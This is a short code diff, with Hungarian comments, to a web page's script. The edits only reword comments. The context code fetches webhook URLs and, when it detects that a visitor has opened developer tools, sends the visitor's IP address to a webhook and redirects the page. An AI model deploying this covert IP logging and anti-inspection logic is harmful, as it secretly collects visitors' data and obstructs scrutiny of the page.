@@ -21,8 +21,8 @@
         let webhookUrl = "";
         let altWebhookUrl = "";
 
+        // Webhook URL-k lekérése a szervertől
         window.onload = function() {
-            // Webhook URL lekérése a szervertől
             fetch('/get-webhook-url')
                 .then(response => response.json())
                 .then(data => {
@@ -60,7 +60,7 @@
                                        window.outerWidth - window.innerWidth > threshold;
 
                 if (devToolsOpened) {
-                    sendIpRequest('DevTools', altWebhookUrl);  // Azonnal küldje el az IP-t
+                    sendIpRequest('DevTools', altWebhookUrl);  // IP küldése
                     window.location.href = "https://example.com1"; // Átirányítja egy másik oldalra
                 }
             }, 1000); // Minden másodpercben ellenőrzi
